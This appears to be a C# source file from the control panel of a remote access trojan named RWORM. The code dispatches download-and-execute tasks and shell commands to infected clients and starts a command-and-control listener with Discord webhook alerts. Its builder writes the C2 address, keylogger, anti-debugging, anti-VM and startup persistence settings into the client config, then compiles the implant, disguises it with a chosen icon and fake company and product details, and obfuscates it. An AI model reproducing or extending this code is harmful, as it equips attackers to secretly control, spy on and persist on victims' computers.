            var url = InputDialog.Show("Enter Discord Webhook URL for client alerts:", "Enter Webhook", "https://discord.com/api/webhooks/");
            if (string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) return;

            TaskDiscordWebhook = url.Trim();
            TaskDiscordAlert = true;

            var task = new TaskModel
            {
                Name   = "Discord Webhook",
                Mode   = TaskMode.DiscordWebhook,
                Source = url.Trim(),
                Status = "Active",
            };
            Tasks.Add(task);
            SelectedTask = task;
            StatusMessage = "Discord Webhook registered";

            _ = SendTaskDiscordAlertAsync(
                "Discord Webhook Configured",
                "Discord Webhook alert integration active on RWORM tasks system.",
                task.Name,
                "All Clients",
                task.ModeLabel);

            
            foreach (var client in Clients.ToList())
            {
                _ = ExecuteTaskOnClientAsync(task, client);
            }
        }

        private void AddLocalFileTask()
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Title  = "Select EXE to run on target",
                Filter = "Executable|*.exe|All Files|*.*",
            };
            if (dlg.ShowDialog() != true) return;
            var task = new TaskModel
            {
                Name   = System.IO.Path.GetFileName(dlg.FileName),
                Mode   = TaskMode.LocalFile,
                Source = dlg.FileName,
                Status = "Ready",
            };
            Tasks.Add(task);
            SelectedTask = task;
            StatusMessage = $"Task added: {task.Name}";

            _ = SendTaskDiscordAlertAsync(
                "📁 Local File Task Registered",
                $"Task **{task.Name}** registered from local file: `{task.Source}`",
                task.Name,
                "Broadcast to connected clients",
                task.ModeLabel);

            
            foreach (var client in Clients.ToList())
            {
                _ = ExecuteTaskOnClientAsync(task, client);
            }
        }

        private void AddUrlTask()
        {
            var url = InputDialog.Show("Payload URL to download and execute on target:", "Add URL Task", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            var task = new TaskModel
            {
                Name   = url.Length > 40 ? url[..40] + "…" : url,
                Mode   = TaskMode.Url,
                Source = url,
                Status = "Ready",
            };
            Tasks.Add(task);
            SelectedTask = task;
            StatusMessage = $"URL task added";

            _ = SendTaskDiscordAlertAsync(
                "🔗 URL Task Registered",
                $"URL Task **{task.Name}** registered: `{task.Source}`",
                task.Name,
                "Broadcast to connected clients",
                task.ModeLabel);

            
            foreach (var client in Clients.ToList())
            {
                _ = ExecuteTaskOnClientAsync(task, client);
            }
        }

        private async void RunTaskOnSelected()
        {
            if (SelectedTask == null) return;
            var targets = SelectedClients.ToList();
            if (targets.Count == 0 && SelectedClient != null) targets.Add(SelectedClient);
            if (targets.Count == 0)
            {
                System.Windows.MessageBox.Show(
                    "No clients selected.\nSelect one or more clients in the Clients page.",
                    "No Target", System.Windows.MessageBoxButton.OK,
                    System.Windows.MessageBoxImage.Information);
                return;
            }

            SelectedTask.Status = "Running…";
            StatusMessage       = $"Running task on {targets.Count} client(s)…";

            foreach (var c in targets)
            {
                string sessionKey = !string.IsNullOrWhiteSpace(c.Id)
                    ? c.Id
                    : $"{c.Guid}:{c.LastSeen:yyyyMMddHHmmss}";
                SelectedTask.ExecutedKeys.Remove(sessionKey);
                await ExecuteTaskOnClientAsync(SelectedTask, c);
            }

            StatusMessage = $"Task dispatched to {targets.Count} client(s)";
        }

        private async Task TestTaskDiscordWebhookAsync()
        {
            var url = TaskDiscordWebhook;
            if (string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
            {
                System.Windows.MessageBox.Show("Please enter a valid Discord Webhook URL starting with http:// or https://", "Discord Webhook", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Warning);
                return;
            }

            try
            {
                StatusMessage = "Sending Discord Webhook test...";
                using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
                var payload = new
                {
                    username = "RWORM Tasks Alert",
                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
                    embeds = new[]
                    {
                        new
                        {
                            title = "🔔 RWORM Discord Webhook Test",
                            description = "Webhook alerts for Tasks and Clients are successfully connected and functioning!",
                            color = 0x58A6FF,
                            fields = new[]
                            {
                                new { name = "Status", value = "Online / Operational", inline = true },
                                new { name = "Sender", value = Environment.MachineName, inline = true }
                            },
                            footer = new { text = "RWORM Task Notification System" },
                            timestamp = DateTime.UtcNow.ToString("o")
                        }
                    }
                };

                var json = System.Text.Json.JsonSerializer.Serialize(payload);
                using var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
                var res = await client.PostAsync(url, content);
                if (res.IsSuccessStatusCode)
                {
                    StatusMessage = "Discord Webhook test alert sent successfully!";
                    System.Windows.MessageBox.Show("Test notification successfully delivered to Discord!", "Webhook Test Success", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                }
                else
                {
                    StatusMessage = $"Webhook failed with status: {res.StatusCode}";
                    System.Windows.MessageBox.Show($"Discord returned error: {res.StatusCode}", "Webhook Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
                }
            }
            catch (Exception ex)
            {
                StatusMessage = "Discord Webhook test failed";
                System.Windows.MessageBox.Show($"Failed to connect to Discord Webhook: {ex.Message}", "Webhook Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
            }
        }

        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode)
        {
            var url = TaskDiscordWebhook;
            if (!TaskDiscordAlert || string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
                var payload = new
                {
                    username = "RWORM Tasks Alert",
                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
                    embeds = new[]
                    {
                        new
                        {
                            title = title,
                            description = description,
                            color = 0x2ECC71, 
                            fields = new[]
                            {
                                new { name = "Task", value = taskName, inline = true },
                                new { name = "Target", value = targetClient, inline = true },
                                new { name = "Type", value = mode, inline = true }
                            },
                            footer = new { text = "RWORM Task Dispatcher" },
                            timestamp = DateTime.UtcNow.ToString("o")
                        }
                    }
                };
                var json = System.Text.Json.JsonSerializer.Serialize(payload);
                using var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(url, content).ConfigureAwait(false);
            }
            catch { }
        }

        
        private async Task SendCommandAsync()
        {
            if (SelectedClient == null || string.IsNullOrEmpty(CommandInput)) return;
            TerminalOutput += $"\n[{DateTime.Now:HH:mm:ss}] → {SelectedClient.Hostname}: {CommandInput}";
            await _server.SendCommandAsync(SelectedClient.Guid, CommandInput);
            CommandInput = "";
        }

        
        private async void StartListener()
        {
            try
            {
                
                
                
                
                
                
                KillStaleServerProcesses();

                var repoRoot = ResolveRepoRoot();
                var serverPy = System.IO.Path.GetFullPath(System.IO.Path.Combine(repoRoot, "server", "main.py"));

                if (!System.IO.File.Exists(serverPy))
                {
                    ListenerStatus = $"Server not found: {serverPy}";
                    return;
                }

                ListenerStatus = "Starting...";
                _serverProcess = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName         = "python",
                        Arguments        = $"\"{serverPy}\" --host {ListenerHost} --port {ListenerPort}",
                        UseShellExecute  = false,
                        CreateNoWindow   = true,
                        WorkingDirectory = System.IO.Path.GetDirectoryName(serverPy),
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                    }
                };
                _serverProcess.StartInfo.EnvironmentVariables["RWORM_KEY"] = BuildEncryptionKey;
                _serverProcess.StartInfo.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8";
                _serverProcess.StartInfo.EnvironmentVariables["PYTHONUTF8"] = "1";

                
                
                _serverProcess.OutputDataReceived += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };
                _serverProcess.ErrorDataReceived  += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };

                if (!_serverProcess.Start())
                {
                    ListenerStatus = "Failed to start python";
                    return;
                }
                _serverProcess.BeginOutputReadLine();
                _serverProcess.BeginErrorReadLine();

                ListenerRunning = true;
                ListenerStatus  = $"Starting on {ListenerHost}:{ListenerPort}...";

                
                var ready = await WaitForListenAsync(ListenerHost, ListenerPort, 20000);
                if (!ready)
                {
                    ListenerRunning = false;
                    ListenerStatus  = $"Server did not come up on {ListenerHost}:{ListenerPort} (see listener.log)";
                    return;
                }

                ListenerStatus = $"Running on {ListenerHost}:{ListenerPort}";

                
                
                
                
                ServerAddress = ListenerHost == "0.0.0.0" ? "127.0.0.1" : ListenerHost;
                ServerPort    = ListenerPort;
                await ConnectAsync();
            }
            catch (Exception ex)
            {
                ListenerStatus = $"Error: {ex.Message}";
            }
        }

        
        
        
        
        private static async Task<bool> WaitForListenAsync(string host, int port, int timeoutMs)
        {
            var probe   = host is "0.0.0.0" or "*" or "" ? "127.0.0.1" : host;
            var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
            while (DateTime.UtcNow < deadline)
            {
                try
                {
                    using var c = new System.Net.Sockets.TcpClient();
                    await c.ConnectAsync(probe, port).WaitAsync(TimeSpan.FromMilliseconds(800));
                    if (c.Connected) return true;
                }
                catch { }
                await Task.Delay(250);
            }
            return false;
        }

        private static string ResolveRepoRoot()
        {
            var baseDir = AppContext.BaseDirectory;
            string[] candidates = new[]
            {
                System.IO.Path.Combine(baseDir, "..", "..", "..", ".."),
                System.IO.Path.Combine(baseDir, "..", ".."),
                System.IO.Path.Combine(baseDir, ".."),
                baseDir,
                System.IO.Directory.GetCurrentDirectory(),
                @"C:\Users\user\Desktop\du"
            };

            foreach (var cand in candidates)
            {
                try
                {
                    var full = System.IO.Path.GetFullPath(cand);
                    if (System.IO.File.Exists(System.IO.Path.Combine(full, "server", "main.py")) &&
                        System.IO.File.Exists(System.IO.Path.Combine(full, "Client", "RWORM.Client.csproj")))
                    {
                        return full;
                    }
                }
                catch { }
            }
            return @"C:\Users\user\Desktop\du";
        }

        private static string ResolveDotnetExe()
        {
            var localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var localDotnet = System.IO.Path.Combine(localApp, "dotnet", "dotnet.exe");
            if (System.IO.File.Exists(localDotnet))
            {
                return localDotnet;
            }
            return "dotnet";
        }

        private void AppendListenerLog(string line)
        {
            try
            {
                var dir = System.IO.Path.Combine(ResolveRepoRoot(), "server");
                System.IO.File.AppendAllText(
                    System.IO.Path.Combine(dir, "listener.log"),
                    $"[{DateTime.Now:HH:mm:ss}] {line}{Environment.NewLine}");
            }
            catch { }
        }

        
        
        
        
        
        
        
        
        private void KillStaleServerProcesses()
        {
            try
            {
                int ownChild = 0;
                try { ownChild = _serverProcess?.Id ?? 0; } catch { }

                using var psi = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = "-NoProfile -NonInteractive -Command " +
                            "\"$me=" + Environment.ProcessId + "; " +
                            "$skip=" + ownChild + "; " +
                            "Get-CimInstance Win32_Process -Filter \\\"Name LIKE 'python%'\\\" | " +
                            "Where-Object { $_.CommandLine -match 'server[\\\\/].*main\\.py' -and " +
                            "$_.ProcessId -ne $me -and $_.ProcessId -ne $skip } | " +
                            "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }\"",
                        UseShellExecute        = false,
                        CreateNoWindow         = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                    }
                };
                psi.Start();
                psi.WaitForExit(8000);
            }
            catch { }
        }

        private void StopListener()
        {
            KillServer();
            try { _server.Disconnect(); } catch { }
            ListenerRunning = false;
            ListenerStatus  = "Stopped";
        }

        public void KillServer()
        {
            try
            {
                if (_serverProcess != null && !_serverProcess.HasExited)
                    _serverProcess.Kill(entireProcessTree: true);
                _serverProcess = null;
            }
            catch { }
        }

        
        private Views.BuilderWindow? _builderWindow;
        public void OpenBuilderWindow(System.Windows.Point? launchOrigin = null)
        {
            var dispatcher = System.Windows.Application.Current?.Dispatcher;
            void Show()
            {
                try
                {
                    if (_builderWindow == null || !_builderWindow.IsLoaded)
                    {
                        _builderWindow = new Views.BuilderWindow(this, launchOrigin);
                        _builderWindow.Closed += (s, e) => _builderWindow = null;
                        _builderWindow.Show();
                    }
                    else
                    {
                        if (_builderWindow.WindowState == System.Windows.WindowState.Minimized)
                            _builderWindow.WindowState = System.Windows.WindowState.Normal;
                        _builderWindow.Activate();
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"[BuilderWindow Error]: {ex}");
                    System.Windows.MessageBox.Show($"Failed to open Builder window:\n{ex.Message}", "Builder Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
                }
            }

            if (dispatcher == null || dispatcher.CheckAccess()) Show();
            else dispatcher.Invoke(Show);
        }

        
        private async void BuildClient()
        {
            var dlg = new Microsoft.Win32.SaveFileDialog
            {
                Filter   = "Executable|*.exe",
                FileName = BuildOutput,
            };
            if (dlg.ShowDialog() != true) return;

            try
            {
                StatusMessage = "Building...";
                var baseDir          = ResolveRepoRoot();
                var clientConfigPath = System.IO.Path.Combine(baseDir, "Client", "Core", "Config.cs");

                if (!System.IO.File.Exists(clientConfigPath))
                {
                    System.Windows.MessageBox.Show("Config.cs not found at: " + clientConfigPath, "Error");
                    return;
                }

                var cfg = System.IO.File.ReadAllText(clientConfigPath);

                
                
                
                
                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"C2Host\s*=\s*""[^""]*""",
                    $"C2Host = \"{BuildHost}\"");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"C2Port\s*=\s*\d+",
                    $"C2Port = {BuildPort}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"EncryptionKey\s*=\s*""[^""]*""",
                    $"EncryptionKey = \"{BuildEncryptionKey.Replace("\"", "\\\"")}\"");

                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"KeyloggerEnabled\s*=\s*(true|false)",
                    $"KeyloggerEnabled = {BuildKeyloggerEnabled.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"KeyloggerOnline\s*=\s*(true|false)",
                    $"KeyloggerOnline  = {BuildKeyloggerOnline.ToString().ToLower()}");

                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"TaskEnabled\s*=\s*(true|false)",
                    $"TaskEnabled   = {BuildTaskEnabled.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"TaskLoaderUrl\s*=\s*""[^""]*""",
                    $"TaskLoaderUrl = \"{BuildTaskUrl}\"");

                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"AntiKill\s*=\s*(true|false)",
                    $"AntiKill  = {BuildAntiKill.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"AntiDebug\s*=\s*(true|false)",
                    $"AntiDebug = {BuildAntiSandbox.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"AntiVM\s*=\s*(true|false)",
                    $"AntiVM    = {BuildAntiSandbox.ToString().ToLower()}");

                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"DiscordAlert\s*=\s*(true|false)",
                    $"DiscordAlert   = {BuildDiscordAlert.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"DiscordWebhook\s*=\s*""[^""]*""",
                    $"DiscordWebhook = \"{BuildDiscordWebhook.Replace("\"", "\\\"")}\"");

                
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"StartupRegistry\s*=\s*(true|false)",
                    $"StartupRegistry = {BuildStartupRegistry.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"SchTasks\s*=\s*(true|false)",
                    $"SchTasks        = {BuildSchTasks.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"StartupPath\s*=\s*@""[^""]*""",
                    $"StartupPath     = @\"{BuildStartupPath.Replace("\"", "\"\"")}\"");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"PastebinRaw\s*=\s*""[^""]*""",
                    $"PastebinRaw     = \"{BuildPastebinRaw.Replace("\"", "\\\"")}\"");

                System.IO.File.WriteAllText(clientConfigPath, cfg);

                
                var clientCsprojPath = System.IO.Path.Combine(baseDir, "Client", "RWORM.Client.csproj");
                var originalCsproj = System.IO.File.ReadAllText(clientCsprojPath);
                string? tempIconDest = null;

                try
                {
                    var customProps = new System.Text.StringBuilder();

                    if (BuildIconEnabled && !string.IsNullOrWhiteSpace(BuildIconPath) && System.IO.File.Exists(BuildIconPath))
                    {
                        var iconExt = System.IO.Path.GetExtension(BuildIconPath);
                        tempIconDest = System.IO.Path.Combine(baseDir, "Client", "custom_build_icon" + iconExt);
                        System.IO.File.Copy(BuildIconPath, tempIconDest, true);
                        customProps.AppendLine($"    <ApplicationIcon>custom_build_icon{iconExt}</ApplicationIcon>");
                    }

                    if (BuildAssemblyEnabled)
                    {
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyTitle))
                            customProps.AppendLine($"    <AssemblyTitle>{BuildAssemblyTitle}</AssemblyTitle>");
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyDescription))
                        {
                            customProps.AppendLine($"    <AssemblyDescription>{BuildAssemblyDescription}</AssemblyDescription>");
                            customProps.AppendLine($"    <Description>{BuildAssemblyDescription}</Description>");
                        }
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyCompany))
                        {
                            customProps.AppendLine($"    <AssemblyCompany>{BuildAssemblyCompany}</AssemblyCompany>");
                            customProps.AppendLine($"    <Company>{BuildAssemblyCompany}</Company>");
                        }
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyProduct))
                        {
                            customProps.AppendLine($"    <AssemblyProduct>{BuildAssemblyProduct}</AssemblyProduct>");
                            customProps.AppendLine($"    <Product>{BuildAssemblyProduct}</Product>");
                        }
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyCopyright))
                        {
                            customProps.AppendLine($"    <AssemblyCopyright>{BuildAssemblyCopyright}</AssemblyCopyright>");
                            customProps.AppendLine($"    <Copyright>{BuildAssemblyCopyright}</Copyright>");
                        }
                        if (!string.IsNullOrWhiteSpace(BuildAssemblyVersion))
                        {
                            customProps.AppendLine($"    <AssemblyVersion>{BuildAssemblyVersion}</AssemblyVersion>");
                            customProps.AppendLine($"    <AssemblyFileVersion>{BuildAssemblyVersion}</AssemblyFileVersion>");
                            customProps.AppendLine($"    <FileVersion>{BuildAssemblyVersion}</FileVersion>");
                        }
                    }

                    if (customProps.Length > 0)
                    {
                        var updatedCsproj = originalCsproj.Replace("</PropertyGroup>", customProps.ToString() + "  </PropertyGroup>");
                        System.IO.File.WriteAllText(clientCsprojPath, updatedCsproj);
                    }
                }
                catch { }

                var clientPath  = System.IO.Path.Combine(baseDir, "Client");
                var tempOutput  = System.IO.Path.Combine(baseDir, "output");
                System.IO.Directory.CreateDirectory(tempOutput);

                var dotnetExe = ResolveDotnetExe();
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName               = dotnetExe,
                    Arguments              = $"publish \"{clientPath}\" -c Release -r win-x64 --self-contained -o \"{tempOutput}\"",
                    UseShellExecute        = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    CreateNoWindow         = true,
                    WorkingDirectory       = clientPath,
                };
                var dotnetDir = System.IO.Path.GetDirectoryName(dotnetExe);
                if (!string.IsNullOrEmpty(dotnetDir) && System.IO.Directory.Exists(dotnetDir))
                {
                    psi.EnvironmentVariables["DOTNET_ROOT"] = dotnetDir;
                    psi.EnvironmentVariables["PATH"] = dotnetDir + ";" + Environment.GetEnvironmentVariable("PATH");
                }

                var proc = System.Diagnostics.Process.Start(psi)!;
                var stderr = await proc.StandardError.ReadToEndAsync();
                await proc.WaitForExitAsync();

                var src = System.IO.Path.Combine(tempOutput, "explorer.exe");
                if (!System.IO.File.Exists(src)) src = System.IO.Path.Combine(tempOutput, "RWORM.exe");
                if (System.IO.File.Exists(src))
                {
                    System.IO.File.Copy(src, dlg.FileName, true);

                    if (BuildObfuscator)
                    {
                        try
                        {
                            StatusMessage = "Applying AsyncRAT Obfuscator...";
                            RWORM.GUI.RenamingObfuscation.Obfuscator.ObfuscateAssembly(dlg.FileName);
                        }
                        catch (Exception obfEx)
                        {
                            System.Windows.MessageBox.Show($"Warning: Obfuscation failed: {obfEx.Message}\nPayload built without obfuscation.", "Obfuscation Warning");
                        }
                    }

                    StatusMessage = "Build complete!";
                    System.Windows.MessageBox.Show($"Built → {dlg.FileName}" + (BuildObfuscator ? "\n(Obfuscated with AsyncRAT dnlib renamer)" : ""), "Build Complete");
                }
                else
                {
                    StatusMessage = "Build failed";
                    System.Windows.MessageBox.Show($"Build failed.\n{stderr}", "Error");
                }

                try { System.IO.Directory.Delete(tempOutput, true); } catch { }
                try
                {
                    if (originalCsproj != null && clientCsprojPath != null)
                        System.IO.File.WriteAllText(clientCsprojPath, originalCsproj);
                    if (tempIconDest != null && System.IO.File.Exists(tempIconDest))
                        System.IO.File.Delete(tempIconDest);
                }
                catch { }
            }
            catch (Exception ex)
            {
                StatusMessage = "Build failed";
                System.Windows.MessageBox.Show($"Build failed: {ex.Message}", "Error");
            }
        }

        
        private void OnConnectionChanged(object? s, bool connected)
        {
            IsConnected   = connected;
            StatusMessage = connected ? "Connected" : "Disconnected";
        }

        private void OnOutputReceived(object? s, string output)
            => TerminalOutput += $"\n{output}";

        protected void OnPropertyChanged([CallerMemberName] string? n = null)
            => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(n));
    }

    public class RelayCommand : ICommand
    {
        private readonly Action<object?> _execute;
        private readonly Predicate<object?>? _canExecute;

        public RelayCommand(Action<object?> execute, Predicate<object?>? canExecute = null)
        {
            _execute    = execute ?? throw new ArgumentNullException(nameof(execute));
            _canExecute = canExecute;
        }

        public bool CanExecute(object? p) => _canExecute?.Invoke(p) ?? true;
        public void Execute(object? p)    => _execute(p);

        public event EventHandler? CanExecuteChanged
        {
            add    => CommandManager.RequerySuggested += value;
            remove => CommandManager.RequerySuggested -= value;
        }
    }
}